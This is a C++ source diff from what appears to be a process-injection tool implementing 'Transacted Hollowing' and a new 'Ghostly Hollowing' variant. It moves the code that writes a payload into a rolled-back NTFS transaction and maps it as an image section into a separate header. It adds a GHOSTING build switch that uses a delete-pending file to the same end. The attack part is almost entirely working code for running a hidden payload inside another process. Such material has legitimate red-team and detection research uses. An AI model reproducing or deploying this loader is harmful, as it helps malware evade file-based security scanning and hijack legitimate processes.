@@ -11,71 +11,11 @@
 #include "pe_hdrs_helper.h"
 #include "hollowing_parts.h"
 
-#pragma comment(lib, "KtmW32.lib")
-#pragma comment(lib, "Ntdll.lib")
-
-HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
-{
-    DWORD options, isolationLvl, isolationFlags, timeout;
-    options = isolationLvl = isolationFlags = timeout = 0;
-
-    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
-    if (hTransaction == INVALID_HANDLE_VALUE) {
-        std::cerr << "Failed to create transaction!" << std::endl;
-        return INVALID_HANDLE_VALUE;
-    }
-    wchar_t dummy_name[MAX_PATH] = { 0 };
-    wchar_t temp_path[MAX_PATH] = { 0 };
-    DWORD size = GetTempPathW(MAX_PATH, temp_path);
-
-    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
-    HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
-        GENERIC_WRITE | GENERIC_READ,
-        0,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL,
-        hTransaction,
-        NULL,
-        NULL
-    );
-    if (hTransactedFile == INVALID_HANDLE_VALUE) {
-        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
-        return INVALID_HANDLE_VALUE;
-    }
-
-    DWORD writtenLen = 0;
-    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
-        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
-        return INVALID_HANDLE_VALUE;
-    }
-
-    HANDLE hSection = nullptr;
-    NTSTATUS status = NtCreateSection(&hSection,
-        SECTION_ALL_ACCESS,
-        NULL,
-        0,
-        PAGE_READONLY,
-        SEC_IMAGE,
-        hTransactedFile
-    );
-    if (status != STATUS_SUCCESS) {
-        std::cerr << "NtCreateSection failed" << std::endl;
-        return INVALID_HANDLE_VALUE;
-    }
-    CloseHandle(hTransactedFile);
-    hTransactedFile = nullptr;
-
-    if (RollbackTransaction(hTransaction) == FALSE) {
-        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
-        return INVALID_HANDLE_VALUE;
-    }
-    CloseHandle(hTransaction);
-    hTransaction = nullptr;
-
-    return hSection;
-}
+#ifndef GHOSTING
+    #include "transacted_file.h"
+#else
+    #include "delete_pending_file.h"
+#endif
 
 bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR cmdLine, LPWSTR startDir = NULL)
 {
@@ -128,10 +68,19 @@ PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
     return sectionBaseAddress;
 }
 
-
 bool transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
 {
-    HANDLE hSection = make_transacted_section(targetPath, payladBuf, payloadSize);
+    wchar_t dummy_name[MAX_PATH] = { 0 };
+    wchar_t temp_path[MAX_PATH] = { 0 };
+    DWORD size = GetTempPathW(MAX_PATH, temp_path);
+    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
+
+#ifndef GHOSTING
+    HANDLE hSection = make_transacted_section(dummy_name, payladBuf, payloadSize);
+#else
+    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);
+#endif
+
     if (!hSection || hSection == INVALID_HANDLE_VALUE) {
         std::cout << "Creating transacted section has failed!\n";
         return false;
@@ -173,7 +122,11 @@ int wmain(int argc, wchar_t *argv[])
     const bool is32bit = true;
 #endif
     if (argc < 2) {
+#ifndef GHOSTING
         std::cout << "Transacted Hollowing (";
+#else
+        std::cout << "Ghostly Hollowing (";
+#endif
         if (is32bit) std::cout << "32bit";
         else std::cout << "64bit";
         std::cout << ")\n";
